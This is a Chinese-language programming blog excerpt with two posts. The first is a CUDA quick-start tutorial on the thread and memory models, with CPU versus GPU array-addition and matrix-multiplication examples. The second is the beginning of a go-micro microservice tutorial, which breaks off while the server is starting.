理解kernel，必须要对kernel的线程层次结构有一个清晰的认识。首先GPU上很多并行化的轻量级线程。kernel在device上执行时实际上是启动很多线程，一个kernel所启动的所有线程称为一个网格（grid），同一个网格上的线程共享相同的全局内存空间，grid是线程结构的第一层次，而网格又可以分为很多线程块（block），一个线程块里面包含很多线程，这是第二个层次。线程两层组织结构如上图所示，这是一个gird和block均为2-dim的线程组织。grid和block都是定义为dim3类型的变量，dim3可以看成是包含三个无符号整数（x，y，z）成员的结构体变量，在定义时，缺省值初始化为1。因此grid和block可以灵活地定义为1-dim，2-dim以及3-dim结构，kernel调用时也必须通过执行配置&lt;&lt;&lt;grid, block&gt;&gt;&gt;来指定kernel所使用的网格维度和线程块维度。举个例子，我们以上图为例，分析怎么通过&lt;&lt;&lt;grid,block&gt;&gt;&gt;&gt;这种标记方式索引到我们想要的那个线程。CUDA的这种&lt;&lt;&lt;grid,block&gt;&gt;&gt;其实就是一个多级索引的方法，第一级索引是(grid.xIdx, grid.yIdy)，对应上图例子就是(1, 1)，通过它我们就能找到了这个线程块的位置，然后我们启动二级索引(block.xIdx, block.yIdx, block.zIdx)来定位到指定的线程。这就是我们CUDA的线程组织结构。 这里想谈谈SP和SM（流处理器），很多人会被这两个专业名词搞得晕头转向。 SP：最基本的处理单元，streaming processor，也称为CUDA core。最后具体的指令和任务都是在SP上处理的。GPU进行并行计算，也就是很多个SP同时做处理。 SM：多个SP加上其他的一些资源组成一个streaming multiprocessor。也叫GPU大核，其他资源如：warp scheduler，register，shared memory等。SM可以看做GPU的心脏（对比CPU核心），register和shared memory是SM的稀缺资源。CUDA将这些资源分配给所有驻留在SM中的threads。因此，这些有限的资源就使每个SM中active warps有非常严格的限制，也就限制了并行能力。 需要指出，每个SM包含的SP数量依据GPU架构而不同，Fermi架构GF100是32个，GF10X是48个，Kepler架构都是192个，Maxwell都是128个。 简而言之，SP是线程执行的硬件单位，SM中包含多个SP，一个GPU可以有多个SM（比如16个），最终一个GPU可能包含有上千个SP。这么多核心“同时运行”，速度可想而知，这个引号只是想表明实际上，软件逻辑上是所有SP是并行的，但是物理上并不是所有SP都能同时执行计算（比如我们只有8个SM却有1024个线程块需要调度处理），因为有些会处于挂起，就绪等其他状态，这有关GPU的线程调度。 下面这个图将从硬件角度和软件角度解释CUDA的线程模型。 每个线程由每个线程处理器（SP）执行 线程块由多核处理器（SM）执行 一个kernel其实由一个grid来执行，一个kernel一次只能在一个GPU上执行 block是软件概念，一个block只会由一个sm调度，程序员在开发时，通过设定block的属性，告诉GPU硬件，我有多少个线程，线程怎么组织。而具体怎么调度由sm的warps scheduler负责，block一旦被分配好SM，该block就会一直驻留在该SM中，直到执行结束。一个SM可以同时拥有多个blocks，但需要序列执行。下图显示了GPU内部的硬件架构： 3. CUDA内存模型CUDA中的内存模型分为以下几个层次： 每个线程都用自己的registers（寄存器） 每个线程都有自己的local memory（局部内存） 每个线程块内都有自己的shared memory（共享内存），所有线程块内的所有线程共享这段内存资源 每个grid都有自己的global memory（全局内存），不同线程块的线程都可使用 每个grid都有自己的constant memory（常量内存）和texture memory（纹理内存），），不同线程块的线程都可使用 线程访问这几类存储器的速度是register &gt; local memory &gt;shared memory &gt; global memory 下面这幅图表示就是这些内存在计算机架构中的所在层次。 4. CUDA编程模型上面讲了这么多硬件相关的知识点，现在终于可以开始说说CUDA是怎么写程序的了。 我们先捋一捋常见的CUDA术语： 第一个要掌握的编程要点：我们怎么写一个能在GPU跑的程序或函数呢？ 通过关键字就可以表示某个程序在CPU上跑还是在GPU上跑！如下表所示，比如我们用__global__定义一个kernel函数，就是CPU上调用，GPU上执行，注意__global__函数的返回值必须设置为void。 第二个编程要点：CPU和GPU间的数据传输怎么写？ 首先介绍在GPU内存分配回收内存的函数接口： cudaMalloc(): 在设备端分配global memory cudaFree(): 释放存储空间 CPU的数据和GPU端数据做数据传输的函数接口是一样的，他们通过传递的函数实参（枚举类型）来表示传输方向： cudaMemcpy(void *dst, void *src, size_t nbytes,enum cudaMemcpyKind direction) enum cudaMemcpyKind: cudaMemcpyHostToDevice（CPU到GPU） cudaMemcpyDeviceToHost（GPU到CPU） cudaMemcpyDeviceToDevice（GPU到GPU） 第三个编程要点是：怎么用代码表示线程组织模型？我们可以用dim3类来表示网格和线程块的组织方式，网格grid可以表示为一维和二维格式，线程块block可以表示为一维、二维和三维的数据格式。 123dim3 DimGrid(100, 50); //5000个线程块，维度是100*50dim3 DimBlock(4, 8, 8); //每个线层块内包含256个线程，线程块内的维度是4*8*8 接下来介绍一个非常重要又很难懂的一个知识点，我们怎么计算线程号呢？ 1.使用N个线程块，每一个线程块只有一个线程，即123dim3 dimGrid(N);dim3 dimBlock(1); 此时的线程号的计算方式就是 1threadId = blockIdx.x; 其中threadId的取值范围为0到N-1。对于这种情况，我们可以将其看作是一个列向量，列向量中的每一行对应一个线程块。列向量中每一行只有1个元素，对应一个线程。 2.使用M×N个线程块，每个线程块1个线程由于线程块是2维的，故可以看做是一个M*N的2维矩阵，其线程号有两个维度，即： 123dim3 dimGrid(M,N);dim3 dimBlock(1); 其中 123blockIdx.x 取值0到M-1blcokIdx.y 取值0到N-1 这种情况一般用于处理2维数据结构，比如2维图像。每一个像素用一个线程来处理，此时需要线程号来映射图像像素的对应位置，如 1pos = blockIdx.y * blcokDim.x + blockIdx.x; //其中gridDim.x等于M 3.使用一个线程块，该线程具有N个线程，即12dim3 dimGrid(1);dim3 dimBlock(N); 此时线程号的计算方式为 1threadId = threadIdx.x; 其中threadId的范围是0到N-1，对于这种情况，可以看做是一个行向量，行向量中的每一个元素的每一个元素对应着一个线程。 4.使用M个线程块，每个线程块内含有N个线程，即12dim3 dimGrid(M);dim3 dimBlock(N); 这种情况，可以把它想象成二维矩阵，矩阵的行与线程块对应，矩阵的列与线程编号对应，那线程号的计算方式为 1threadId = threadIdx.x + blcokIdx*blockDim.x; 上面其实就是把二维的索引空间转换为一维索引空间的过程。 5.使用M×N的二维线程块，每一个线程块具有P×Q个线程，即12dim3 dimGrid(M, N);dim3 dimBlock(P, Q); 这种情况其实是我们遇到的最多情况，特别适用于处理具有二维数据结构的算法，比如图像处理领域。 其索引有两个维度 12threadId.x = blockIdx.x*blockDim.x+threadIdx.x;threadId.y = blockIdx.y*blockDim.y+threadIdx.y; 上述公式就是把线程和线程块的索引映射为图像像素坐标的计算方法。 CUDA应用例子我们已经掌握了CUDA编程的基本语法，现在我们开始以一些小例子来真正上手CUDA。 首先我们编写一个程序，查看我们GPU的一些硬件配置情况。 123456789101112131415161718192021222324252627#include &quot;device_launch_parameters.h&quot;#include &lt;iostream&gt;int main(){ int deviceCount; cudaGetDeviceCount(&amp;deviceCount); for(int i=0;i&lt;deviceCount;i++) { cudaDeviceProp devProp; cudaGetDeviceProperties(&amp;devProp, i); std::cout &lt;&lt; &quot;使用GPU device &quot; &lt;&lt; i &lt;&lt; &quot;: &quot; &lt;&lt; devProp.name &lt;&lt; std::endl; std::cout &lt;&lt; &quot;设备全局内存总量： &quot; &lt;&lt; devProp.totalGlobalMem / 1024 / 1024 &lt;&lt; &quot;MB&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;SM的数量：&quot; &lt;&lt; devProp.multiProcessorCount &lt;&lt; std::endl; std::cout &lt;&lt; &quot;每个线程块的共享内存大小：&quot; &lt;&lt; devProp.sharedMemPerBlock / 1024.0 &lt;&lt; &quot; KB&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;每个线程块的最大线程数：&quot; &lt;&lt; devProp.maxThreadsPerBlock &lt;&lt; std::endl; std::cout &lt;&lt; &quot;设备上一个线程块（Block）种可用的32位寄存器数量： &quot; &lt;&lt; devProp.regsPerBlock &lt;&lt; std::endl; std::cout &lt;&lt; &quot;每个EM的最大线程数：&quot; &lt;&lt; devProp.maxThreadsPerMultiProcessor &lt;&lt; std::endl; std::cout &lt;&lt; &quot;每个EM的最大线程束数：&quot; &lt;&lt; devProp.maxThreadsPerMultiProcessor / 32 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;设备上多处理器的数量： &quot; &lt;&lt; devProp.multiProcessorCount &lt;&lt; std::endl; std::cout &lt;&lt; &quot;======================================================&quot; &lt;&lt; std::endl; } return 0;} 我们利用nvcc来编译程序。 1nvcc test1.cu -o test1 输出结果：因为我的服务器是8个TITAN GPU，为了省略重复信息，下面只显示两个GPU结果 12345678910111213141516171819202122使用GPU device 0: TITAN X (Pascal)设备全局内存总量： 12189MBSM的数量：28每个线程块的共享内存大小：48 KB每个线程块的最大线程数：1024设备上一个线程块（Block）种可用的32位寄存器数量： 65536每个EM的最大线程数：2048每个EM的最大线程束数：64设备上多处理器的数量： 28======================================================使用GPU device 1: TITAN X (Pascal)设备全局内存总量： 12189MBSM的数量：28每个线程块的共享内存大小：48 KB每个线程块的最大线程数：1024设备上一个线程块（Block）种可用的32位寄存器数量： 65536每个EM的最大线程数：2048每个EM的最大线程束数：64设备上多处理器的数量： 28======================================================....... 第一个计算任务：将两个元素数目为1024×1024的float数组相加。 首先我们思考一下如果只用CPU我们怎么串行完成这个任务。 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;iostream&gt;#include &lt;stdlib.h&gt;#include &lt;sys/time.h&gt;#include &lt;math.h&gt;using namespace std;int main(){ struct timeval start, end; gettimeofday( &amp;start, NULL ); float*A, *B, *C; int n = 1024 * 1024; int size = n * sizeof(float); A = (float*)malloc(size); B = (float*)malloc(size); C = (float*)malloc(size); for(int i=0;i&lt;n;i++) { A[i] = 90.0; B[i] = 10.0; } for(int i=0;i&lt;n;i++) { C[i] = A[i] + B[i]; } float max_error = 0.0; for(int i=0;i&lt;n;i++) { max_error += fabs(100.0-C[i]); } cout &lt;&lt; &quot;max_error is &quot; &lt;&lt; max_error &lt;&lt; endl; gettimeofday( &amp;end, NULL ); int timeuse = 1000000 * ( end.tv_sec - start.tv_sec ) + end.tv_usec - start.tv_usec; cout &lt;&lt; &quot;total time is &quot; &lt;&lt; timeuse/1000 &lt;&lt; &quot;ms&quot; &lt;&lt;endl; return 0;} CPU方式输出结果 12max_error is 0total time is 22ms 如果我们使用GPU来做并行计算，速度将会如何呢？ 编程要点： 每个Block中的Thread数最大不超过512； 为了充分利用SM，Block数尽可能多，&gt;100。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#include &quot;cuda_runtime.h&quot;#include &lt;stdlib.h&gt;#include &lt;iostream&gt;#include &lt;sys/time.h&gt;using namespace std;__global__ void Plus(float A[], float B[], float C[], int n){ int i = blockDim.x * blockIdx.x + threadIdx.x; C[i] = A[i] + B[i];}int main(){ struct timeval start, end; gettimeofday( &amp;start, NULL ); float*A, *Ad, *B, *Bd, *C, *Cd; int n = 1024 * 1024; int size = n * sizeof(float); // CPU端分配内存 A = (float*)malloc(size); B = (float*)malloc(size); C = (float*)malloc(size); // 初始化数组 for(int i=0;i&lt;n;i++) { A[i] = 90.0; B[i] = 10.0; } // GPU端分配内存 cudaMalloc((void**)&amp;Ad, size); cudaMalloc((void**)&amp;Bd, size); cudaMalloc((void**)&amp;Cd, size); // CPU的数据拷贝到GPU端 cudaMemcpy(Ad, A, size, cudaMemcpyHostToDevice); cudaMemcpy(Bd, B, size, cudaMemcpyHostToDevice); cudaMemcpy(Bd, B, size, cudaMemcpyHostToDevice); // 定义kernel执行配置，（1024*1024/512）个block，每个block里面有512个线程 dim3 dimBlock(512); dim3 dimGrid(n/512); // 执行kernel Plus&lt;&lt;&lt;dimGrid, dimBlock&gt;&gt;&gt;(Ad, Bd, Cd, n); // 将在GPU端计算好的结果拷贝回CPU端 cudaMemcpy(C, Cd, size, cudaMemcpyDeviceToHost); // 校验误差 float max_error = 0.0; for(int i=0;i&lt;n;i++) { max_error += fabs(100.0 - C[i]); } cout &lt;&lt; &quot;max error is &quot; &lt;&lt; max_error &lt;&lt; endl; // 释放CPU端、GPU端的内存 free(A); free(B); free(C); cudaFree(Ad); cudaFree(Bd); cudaFree(Cd); gettimeofday( &amp;end, NULL ); int timeuse = 1000000 * ( end.tv_sec - start.tv_sec ) + end.tv_usec - start.tv_usec; cout &lt;&lt; &quot;total time is &quot; &lt;&lt; timeuse/1000 &lt;&lt; &quot;ms&quot; &lt;&lt;endl; return 0;} GPU方式输出结果 12max error is 0total time is 1278ms 由上面的例子看出，使用CUDA编程时我们看不到for循环了，因为CPU编程的循环已经被分散到各个thread上做了，所以我们也就看到不到for一类的语句。从结果上看，CPU的循环计算的速度比GPU计算快多了，原因就在于CUDA中有大量的内存拷贝操作（数据传输花费了大量时间，而计算时间却非常少），如果计算量比较小的话，CPU计算会更合适一些。 下面计算一个稍微复杂的例子，矩阵加法，即对两个矩阵对应坐标的元素相加后的结果存储在第三个的对应位置的元素上。 值得注意的是，这个计算任务我采用了二维数组的计算方式，注意一下二维数组在CUDA编程中的写法。 CPU版本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;stdlib.h&gt;#include &lt;iostream&gt;#include &lt;sys/time.h&gt;#include &lt;math.h&gt;#define ROWS 1024#define COLS 1024using namespace std;int main(){ struct timeval start, end; gettimeofday( &amp;start, NULL ); int *A, **A_ptr, *B, **B_ptr, *C, **C_ptr; int total_size = ROWS*COLS*sizeof(int); A = (int*)malloc(total_size); B = (int*)malloc(total_size); C = (int*)malloc(total_size); A_ptr = (int**)malloc(ROWS*sizeof(int*)); B_ptr = (int**)malloc(ROWS*sizeof(int*)); C_ptr = (int**)malloc(ROWS*sizeof(int*)); //CPU一维数组初始化 for(int i=0;i&lt;ROWS*COLS;i++) { A[i] = 80; B[i] = 20; } for(int i=0;i&lt;ROWS;i++) { A_ptr[i] = A + COLS*i; B_ptr[i] = B + COLS*i; C_ptr[i] = C + COLS*i; } for(int i=0;i&lt;ROWS;i++) for(int j=0;j&lt;COLS;j++) { C_ptr[i][j] = A_ptr[i][j] + B_ptr[i][j]; } //检查结果 int max_error = 0; for(int i=0;i&lt;ROWS*COLS;i++) { //cout &lt;&lt; C[i] &lt;&lt; endl; max_error += abs(100-C[i]); } cout &lt;&lt; &quot;max_error is &quot; &lt;&lt; max_error &lt;&lt;endl; gettimeofday( &amp;end, NULL ); int timeuse = 1000000 * ( end.tv_sec - start.tv_sec ) + end.tv_usec - start.tv_usec; cout &lt;&lt; &quot;total time is &quot; &lt;&lt; timeuse/1000 &lt;&lt; &quot;ms&quot; &lt;&lt;endl; return 0;} CPU方式输出 12max_error is 0total time is 29ms GPU版本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495#include &quot;cuda_runtime.h&quot;#include &quot;device_launch_parameters.h&quot;#include &lt;sys/time.h&gt; #include &lt;stdio.h&gt;#include &lt;math.h&gt;#define Row 1024#define Col 1024 __global__ void addKernel(int **C, int **A, int ** B){ int idx = threadIdx.x + blockDim.x * blockIdx.x; int idy = threadIdx.y + blockDim.y * blockIdx.y; if (idx &lt; Col &amp;&amp; idy &lt; Row) { C[idy][idx] = A[idy][idx] + B[idy][idx]; }} int main(){ struct timeval start, end; gettimeofday( &amp;start, NULL ); int **A = (int **)malloc(sizeof(int*) * Row); int **B = (int **)malloc(sizeof(int*) * Row); int **C = (int **)malloc(sizeof(int*) * Row); int *dataA = (int *)malloc(sizeof(int) * Row * Col); int *dataB = (int *)malloc(sizeof(int) * Row * Col); int *dataC = (int *)malloc(sizeof(int) * Row * Col); int **d_A; int **d_B; int **d_C; int *d_dataA; int *d_dataB; int *d_dataC; //malloc device memory cudaMalloc((void**)&amp;d_A, sizeof(int **) * Row); cudaMalloc((void**)&amp;d_B, sizeof(int **) * Row); cudaMalloc((void**)&amp;d_C, sizeof(int **) * Row); cudaMalloc((void**)&amp;d_dataA, sizeof(int) *Row*Col); cudaMalloc((void**)&amp;d_dataB, sizeof(int) *Row*Col); cudaMalloc((void**)&amp;d_dataC, sizeof(int) *Row*Col); //set value for (int i = 0; i &lt; Row*Col; i++) { dataA[i] = 90; dataB[i] = 10; } //将主机指针A指向设备数据位置，目的是让设备二级指针能够指向设备数据一级指针 //A 和 dataA 都传到了设备上，但是二者还没有建立对应关系 for (int i = 0; i &lt; Row; i++) { A[i] = d_dataA + Col * i; B[i] = d_dataB + Col * i; C[i] = d_dataC + Col * i; } cudaMemcpy(d_A, A, sizeof(int*) * Row, cudaMemcpyHostToDevice); cudaMemcpy(d_B, B, sizeof(int*) * Row, cudaMemcpyHostToDevice); cudaMemcpy(d_C, C, sizeof(int*) * Row, cudaMemcpyHostToDevice); cudaMemcpy(d_dataA, dataA, sizeof(int) * Row * Col, cudaMemcpyHostToDevice); cudaMemcpy(d_dataB, dataB, sizeof(int) * Row * Col, cudaMemcpyHostToDevice); dim3 threadPerBlock(16, 16); dim3 blockNumber( (Col + threadPerBlock.x - 1)/ threadPerBlock.x, (Row + threadPerBlock.y - 1) / threadPerBlock.y ); printf(&quot;Block(%d,%d) Grid(%d,%d).\\n&quot;, threadPerBlock.x, threadPerBlock.y, blockNumber.x, blockNumber.y); addKernel &lt;&lt; &lt;blockNumber, threadPerBlock &gt;&gt; &gt; (d_C, d_A, d_B); //拷贝计算数据-一级数据指针 cudaMemcpy(dataC, d_dataC, sizeof(int) * Row * Col, cudaMemcpyDeviceToHost); int max_error = 0; for(int i=0;i&lt;Row*Col;i++) { //printf(&quot;%d\\n&quot;, dataC[i]); max_error += abs(100-dataC[i]); } //释放内存 free(A); free(B); free(C); free(dataA); free(dataB); free(dataC); cudaFree(d_A); cudaFree(d_B); cudaFree(d_C); cudaFree(d_dataA); cudaFree(d_dataB); cudaFree(d_dataC); printf(&quot;max_error is %d\\n&quot;, max_error); gettimeofday( &amp;end, NULL ); int timeuse = 1000000 * ( end.tv_sec - start.tv_sec ) + end.tv_usec - start.tv_usec; printf(&quot;total time is %d ms\\n&quot;, timeuse/1000); return 0;} GPU输出 123Block(16,16) Grid(64,64).max_error is 0total time is 442 ms 从结果看出，CPU计算时间还是比GPU的计算时间短。这里需要指出的是，这种二维数组的程序写法的效率并不高（虽然比较符合我们的思维方式），因为我们做了两次访存操作。所以一般而言，做高性能计算一般不会采取这种编程方式。 最后一个例子我们将计算一个更加复杂的任务，矩阵乘法 回顾一下矩阵乘法：两矩阵相乘，左矩阵第一行乘以右矩阵第一列（分别相乘，第一个数乘第一个数），乘完之后相加，即为结果的第一行第一列的数，依次往下算，直到计算完所有矩阵元素。 CPU版本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;iostream&gt;#include &lt;stdlib.h&gt;#include &lt;sys/time.h&gt;#define ROWS 1024#define COLS 1024using namespace std;void matrix_mul_cpu(float* M, float* N, float* P, int width){ for(int i=0;i&lt;width;i++) for(int j=0;j&lt;width;j++) { float sum = 0.0; for(int k=0;k&lt;width;k++) { float a = M[i*width+k]; float b = N[k*width+j]; sum += a*b; } P[i*width+j] = sum; }}int main(){ struct timeval start, end; gettimeofday( &amp;start, NULL ); float *A, *B, *C; int total_size = ROWS*COLS*sizeof(float); A = (float*)malloc(total_size); B = (float*)malloc(total_size); C = (float*)malloc(total_size); //CPU一维数组初始化 for(int i=0;i&lt;ROWS*COLS;i++) { A[i] = 80.0; B[i] = 20.0; } matrix_mul_cpu(A, B, C, COLS); gettimeofday( &amp;end, NULL ); int timeuse = 1000000 * ( end.tv_sec - start.tv_sec ) + end.tv_usec - start.tv_usec; cout &lt;&lt; &quot;total time is &quot; &lt;&lt; timeuse/1000 &lt;&lt; &quot;ms&quot; &lt;&lt;endl; return 0;} CPU输出 1total time is 7617ms 梳理一下CUDA求解矩阵乘法的思路：因为C=A×B，我们利用每个线程求解C矩阵每个(x, y)的元素，每个线程载入A的一行和B的一列，遍历各自行列元素，对A、B对应的元素做一次乘法和一次加法。 GPU版本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#include &quot;cuda_runtime.h&quot;#include &quot;device_launch_parameters.h&quot;#include &lt;sys/time.h&gt; #include &lt;stdio.h&gt;#include &lt;math.h&gt;#define Row 1024#define Col 1024 __global__ void matrix_mul_gpu(int *M, int* N, int* P, int width){ int i = threadIdx.x + blockDim.x * blockIdx.x; int j = threadIdx.y + blockDim.y * blockIdx.y; int sum = 0; for(int k=0;k&lt;width;k++) { int a = M[j*width+k]; int b = N[k*width+i]; sum += a*b; } P[j*width+i] = sum;} int main(){ struct timeval start, end; gettimeofday( &amp;start, NULL ); int *A = (int *)malloc(sizeof(int) * Row * Col); int *B = (int *)malloc(sizeof(int) * Row * Col); int *C = (int *)malloc(sizeof(int) * Row * Col); //malloc device memory int *d_dataA, *d_dataB, *d_dataC; cudaMalloc((void**)&amp;d_dataA, sizeof(int) *Row*Col); cudaMalloc((void**)&amp;d_dataB, sizeof(int) *Row*Col); cudaMalloc((void**)&amp;d_dataC, sizeof(int) *Row*Col); //set value for (int i = 0; i &lt; Row*Col; i++) { A[i] = 90; B[i] = 10; } cudaMemcpy(d_dataA, A, sizeof(int) * Row * Col, cudaMemcpyHostToDevice); cudaMemcpy(d_dataB, B, sizeof(int) * Row * Col, cudaMemcpyHostToDevice); dim3 threadPerBlock(16, 16); dim3 blockNumber((Col+threadPerBlock.x-1)/ threadPerBlock.x, (Row+threadPerBlock.y-1)/ threadPerBlock.y ); printf(&quot;Block(%d,%d) Grid(%d,%d).\\n&quot;, threadPerBlock.x, threadPerBlock.y, blockNumber.x, blockNumber.y); matrix_mul_gpu &lt;&lt; &lt;blockNumber, threadPerBlock &gt;&gt; &gt; (d_dataA, d_dataB, d_dataC, Col); //拷贝计算数据-一级数据指针 cudaMemcpy(C, d_dataC, sizeof(int) * Row * Col, cudaMemcpyDeviceToHost); //释放内存 free(A); free(B); free(C); cudaFree(d_dataA); cudaFree(d_dataB); cudaFree(d_dataC); gettimeofday( &amp;end, NULL ); int timeuse = 1000000 * ( end.tv_sec - start.tv_sec ) + end.tv_usec - start.tv_usec; printf(&quot;total time is %d ms\\n&quot;, timeuse/1000); return 0;} GPU输出 12Block(16,16) Grid(64,64).total time is 506 ms 从这个矩阵乘法任务可以看出，我们通过GPU进行并行计算的方式仅花费了0.5秒，但是CPU串行计算方式却花费了7.6秒，计算速度提升了十多倍，可见并行计算的威力！","link":"/2018/09/19/CUDA%E7%BC%96%E7%A8%8B%E4%B9%8B%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/"},{"title":"Go快速上手--微服务框架go-micro","text":"go-micro特性Go Micro是一个流行的微服务架构，是一个插件化的基础框架，基于此可以构建微服务，Micro的设计哲学是可插拔的插件化架构。Go Micro 简单轻巧、易于上手、功能强大、扩展方便，是基于 Go 语言进行微服务架构时非常值得推荐的一个框架。 Go Micro有以下重要特性： 服务发现：自动服务注册和名称解析。服务发现是微服务开发的核心。 负载均衡：基于服务发现构建的客户端负载均衡。一旦我们获得了服务的任意数量实例的地址，我们现在需要一种方法来决定要路由到哪个节点。 消息编码：基于内容类型的动态消息编码。这包括默认的protobuf和json。 请求/响应：基于RPC的请求/响应，支持双向流。 Async Messaging：PubSub是异步通信和事件驱动架构的重要设计思想。事件通知是微服务开发的核心模式。 可插拔接口：Go Micro为每个分布式系统抽象使用Go接口，因此，这些接口是可插拔的，并允许Go Micro与运行时无关，可以插入任何基础技术 go-micro通信流程通信的角色一共4个：server,client,register和broker，他们的各种的作用在于： Server监听客户端的调用，和Broker推送过来的信息进行处理。并且Server端需要向Register注册自己的存在或消亡，这样Client才能知道自己的状态； Register服务的注册的发现，Client端从Register中得到Server的信息，然后每次调用都根据算法选择一个的Server进行通信，当然通信是要经过编码/解码，选择传输协议等一系列过程； 如果有需要通知所有的Server端可以使用Broker进行信息的推送，Broker 通过队列进行信息的接收和发布； Go Micro 框架的基础架构如上图所示，由 8 个核心接口组成，每个接口都有默认实现。Go micro 由以下接口列表组成: 最顶层的 Service 接口是构建服务的主要组件，它把底层的各个包需要实现的接口，做了一次封装，包含了一系列用于初始化 Service 和 Client 的方法，使我们可以很简单的创建一个 RPC 服务； server - 用于处理请求和通知。服务器是编写服务的构建基块，内置服务器是 RPC 系统 client - 用于高级别请求/响应和通知； broker - 异步消息传递，其实就是一个消息队列系统； config - 用于动态配置的。配置是一个接口, 用于从任意数量的源进行动态配置加载，其实就是一个配置进程/中心； codec - 用于消息编码的（序列化和反序列化）。编解码器用于编码和解码消息, 然后再通过导线传输消息. 数据可能是 json, protobuf, beson, msgpack 等。 registry - 服务发现的注册表。注册表提供一种服务发现机制, 用于将名称解析为地址. 它可以由 consul, etcd zookeeper, dns, gossip 等支持. 服务应在启动时使用注册表进行注册, 并在关闭时取消注册。 selector - 用于负载平衡。选择器是一个负载平衡抽象, 它建立在注册表上。 户在发出请求时利用选择器. 客户端将使用选择器而不是注册表, 因为它提供了内置的负载平衡机制. store - 用于数据存储。存储是一个简单的键值存储接口, 用于抽象掉轻量级数据存储，仅用于保存简单的状态信息，比如用户的验证状态。 transport - 用于同步通信。传输是服务之间同步请求/响应通信的接口. 它类似于 golang 网络包, 但提供了一个更高级别的抽象, 允许我们切换通信机制 Go Micro的接口间的关系如上图所示，每个接口都支持业界流行的开源方案，具体如下： go-micro最重要的是service的创建，因为go-micro现在发布了v3版本，V2版本作者表示已经不再维护了，因此这里介绍V2和V3版本的go micro 如何创建一个服务，以及基本的服务管理指令。我们生产环境用的是V2版本，至于V3，看了下网上的资源以及项目中相关的特性介绍，感觉还是处于很初级的状态，如果直接用于生产环境感觉坑会不少，但是本着学习的目的还是想实践一下这个V3版本。另外，go micro的broker机制我们也给了实践例子，体验了go micro异步消息通信机制。 新建服务（基于micro v2）先安装相关组件 go get github.com/micro/micro/v3/cmd/protoc-gen-micro@master go get github.com/micro/micro/v2 我们先定义一个简单的protobuf协议文件greet.proto，定义的服务名称为Greet。 12345678910111213141516syntax = &quot;proto3&quot;; // 指定proto版本// 指定golang包名option go_package = &quot;pb/proto_demo&quot;;service Greeter { rpc Greet(Request) returns (Response) {}}message Request { string name = 1;}message Response { string msg = 1;} 安装之后，利用protoc-gen-go和protoc-gen-micro生成协议go文件。这次一共会生成两个协议文件：greet.pb.go和greet.pb.micro.go。 1protoc --micro_out=. --go_out=. ./greet.proto 着重观察下生成的micro版的go协议文件greet.pb.micro.go 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394// Code generated by protoc-gen-micro. DO NOT EDIT.// source: greet.protopackage proto_demoimport ( fmt &quot;fmt&quot; proto &quot;github.com/golang/protobuf/proto&quot; math &quot;math&quot;)import ( context &quot;context&quot; client &quot;github.com/micro/go-micro/v2/client&quot; server &quot;github.com/micro/go-micro/v2/server&quot; api &quot;github.com/micro/micro/v3/service/api&quot;)// Reference imports to suppress errors if they are not otherwise used.var _ = proto.Marshalvar _ = fmt.Errorfvar _ = math.Inf// This is a compile-time assertion to ensure that this generated file// is compatible with the proto package it is being compiled against.// A compilation error at this line likely means your copy of the// proto package needs to be updated.const _ = proto.ProtoPackageIsVersion3 // please upgrade the proto package// Reference imports to suppress errors if they are not otherwise used.var _ api.Endpointvar _ context.Contextvar _ client.Optionvar _ server.Option// Api Endpoints for Greeter servicefunc NewGreeterEndpoints() []*api.Endpoint { return []*api.Endpoint{}}// Client API for Greeter servicetype GreeterService interface { Greet(ctx context.Context, in *Request, opts ...client.CallOption) (*Response, error)}type greeterService struct { c client.Client name string}func NewGreeterService(name string, c client.Client) GreeterService { return &amp;greeterService{ c: c, name: name, }}func (c *greeterService) Greet(ctx context.Context, in *Request, opts ...client.CallOption) (*Response, error) { req := c.c.NewRequest(c.name, &quot;Greeter.Greet&quot;, in) out := new(Response) err := c.c.Call(ctx, req, out, opts...) if err != nil { return nil, err } return out, nil}// Server API for Greeter servicetype GreeterHandler interface { Greet(context.Context, *Request, *Response) error}func RegisterGreeterHandler(s server.Server, hdlr GreeterHandler, opts ...server.HandlerOption) error { type greeter interface { Greet(ctx context.Context, in *Request, out *Response) error } type Greeter struct { greeter } h := &amp;greeterHandler{hdlr} return s.Handle(s.NewHandler(&amp;Greeter{h}, opts...))}type greeterHandler struct { GreeterHandler}func (h *greeterHandler) Greet(ctx context.Context, in *Request, out *Response) error { return h.GreeterHandler.Greet(ctx, in, out)} 这个文件里定义了服务结构体GreeterService，RPC函数实现Greet。 现在先编写服务端代码micro_server/main.go 12345678910111213141516171819202122232425262728293031323334package mainimport ( &quot;context&quot; &quot;fmt&quot; micro &quot;github.com/micro/go-micro/v2&quot; proto &quot;web_demo/proto/pb/proto_demo&quot;)type Greeter struct{}func (g *Greeter) Greet(ctx context.Context, req *proto.Request, rsp *proto.Response) error { rsp.Msg = &quot;Greet &quot; + req.Name return nil}func main() { // 创建一个新服务 service := micro.NewService( micro.Name(&quot;greeter&quot;), ) // 服务初始化 service.Init() // 注册 handler处理函数 proto.RegisterGreeterHandler(service.Server(), new(Greeter)) // 启动服务 if err := service.Run(); err != nil { fmt.Println(err) }} 编写客户端micro_client/main.go，客户端向服务器发起RPC调用。 12345678910111213141516171819202122232425262728package mainimport ( &quot;context&quot; &quot;fmt&quot; micro &quot;github.com/micro/go-micro/v2&quot; proto &quot;web_demo/proto/pb/proto_demo&quot;)func main() { // 创建新服务 service := micro.NewService(micro.Name(&quot;greeter.client&quot;)) // 服务初始化 service.Init() // 创建RPC的客户端实例 greeter := proto.NewGreeterService(&quot;greeter&quot;, service.Client()) // 发起RPC调用 rsp, err := greeter.Greet(context.TODO(), &amp;proto.Request{Name: &quot;John&quot;}) if err != nil { fmt.Println(err) } // 打印返回值 fmt.Println(rsp.Msg)} 先启动server 1234unshideMacBook-Pro:micro_server junshili$ go run main.go 2021-05-07 00:50:11 file=v2@v2.9.1/service.go:200 level=info Starting 